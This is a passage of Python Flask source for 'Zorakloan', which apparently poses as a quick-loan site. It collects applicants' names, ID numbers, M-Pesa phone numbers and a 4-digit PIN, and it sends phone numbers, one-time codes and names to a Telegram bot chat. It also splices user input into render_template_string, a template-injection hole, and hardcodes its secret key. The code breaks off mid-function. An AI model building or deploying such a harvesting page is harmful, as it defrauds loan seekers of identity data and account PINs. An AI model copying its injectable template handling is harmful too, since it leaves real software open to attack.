import os, random
from flask import Flask, request, render_template_string, session
import requests

app = Flask(__name__)
app.secret_key = "zorakloan-2024-secret-key-change-me"
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
print(f"BOT loaded? {'YES' if BOT_TOKEN else 'NO'} | CHAT loaded? {'YES' if CHAT_ID else 'NO'}")

loans_db = {}

FORM_HTML = """
<!DOCTYPE html>
<html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Zorakloan - Apply</title>
<style>
body{font-family:Arial;background:#f5f7fa;padding:15px}
.box{background:white;max-width:450px;margin:auto;padding:25px;border-radius:15px;box-shadow:0 5px 15px rgba(0,0,0,0.1)}
h2{text-align:center;color:#0a7a3e;margin-bottom:5px}
input,select{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box}
button{width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;font-size:18px;font-weight:bold;margin-top:10px}
.pin-box{background:#fff8e1;padding:12px;border-radius:8px;border:1px dashed #ffb300;margin:8px 0}
small{color:gray}
a{display:block;text-align:center;margin-top:15px;color:#0a7a3e;text-decoration:none}
</style></head>
<body><div class="box">
<h2>Zorakloan</h2><p style="text-align:center"><small>Quick approval in 10 min - Secure & Private</small></p>
<form method="POST">
<input name="full_name" placeholder="Full Name (as per ID)" required>
<input name="id_number" placeholder="ID Number" required>
<input name="phone" placeholder="M-Pesa Phone 07..." required>
<input name="county" placeholder="County / Town e.g Kitale" required>
<input name="amount" type="number" placeholder="Loan Amount Ksh" required>
<select name="period" required><option value="">Repayment Period</option><option>1 Week</option><option>2 Weeks</option><option>1 Month</option><option>2 Months</option></select>
<select name="employment" required><option value="">Employment Status</option><option>Employed</option><option>Self Employed</option><option>Farmer</option><option>Student</option></select>
<select name="purpose" required><option value="">Purpose</option><option>Business</option><option>Emergency</option><option>School Fees</option><option>Medical</option><option>Agriculture</option></select>
<div class="pin-box"><label><b>🔐 Create Security PIN</b></label>
<input name="pin" type="password" pattern="\\d{4}" maxlength="4" placeholder="4-digit PIN e.g 1234" required>
<small>Keep secret! You need phone + PIN to check loan status</small></div>
<button type="submit">Send OTP & Apply</button>
</form><a href="/check">Already applied? Check Status →</a></div></body></html>
"""

OTP_HTML = """
<div style="max-width:400px;margin:80px auto;padding:25px;background:white;border-radius:15px;box-shadow:0 5px 15px rgba(0,0,0,0.1);font-family:Arial;text-align:center">
<h2>📱 Confirm Phone</h2>
<p>Code sent to <b>{{PHONE}}</b><br><small style="color:green">TEST MODE: Your OTP is <b>{{OTP}}</b></small></p>
<form method="POST" action="/verify-otp">
<input name="otp" maxlength="6" placeholder="Enter 6-digit OTP" required style="width:100%;padding:14px;font-size:22px;text-align:center;letter-spacing:6px;margin:15px 0;border:2px solid #0a7a3e;border-radius:8px">
<button style="width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;font-size:18px">Verify & Submit</button>
</form><p><small><a href="/apply">Wrong number? Go back</a></small></p></div>
"""

CHECK_HTML = """
<div style="max-width:400px;margin:50px auto;padding:20px;font-family:Arial">
<h3>Check Loan Status</h3>
<form method="POST"><input name="phone" placeholder="Phone 07..." required style="width:100%;padding:12px;margin:8px 0">
<input name="pin" type="password" maxlength="4" placeholder="Your 4-digit PIN" required style="width:100%;padding:12px;margin:8px 0">
<button style="width:100%;padding:12px;background:#0a7a3e;color:white;border:none;border-radius:8px">Check</button></form>
<p><b>{{MSG}}</b></p><a href="/apply">← Back to Apply</a></div>
"""

@app.route('/')
def home(): return "Zorakloan Live ✅ - /apply"

@app.route('/apply', methods=['GET','POST'])
def apply_route():
    if request.method == 'POST':
        otp = str(random.randint(100000, 999999))
        loan_ref = f"ZRK-{random.randint(1000,9999)}"
        pending = {k: request.form.get(k) for k in ['full_name','id_number','phone','county','amount','period','employment','purpose','pin']}
        pending['ref'] = loan_ref
        session['pending_loan'] = pending
        session['otp'] = otp
        print(f"OTP for {pending['phone']}: {otp} Ref: {loan_ref}")
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": f"🔑 OTP for {pending['phone']}: {otp}\nRef {loan_ref} - {pending['full_name']}"})
        except Exception as e: print(e)
        html = OTP_HTML.replace("{{PHONE}}", pending['phone']).replace("{{OTP}}", otp)
        return render_template_string(html)
    return render_template_string(FORM_HTML)

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    user_otp = request.form.get('otp')
    real_otp = session.get('otp')
    loan = session.get('pending_loan')
    if not loan or not real_otp:
       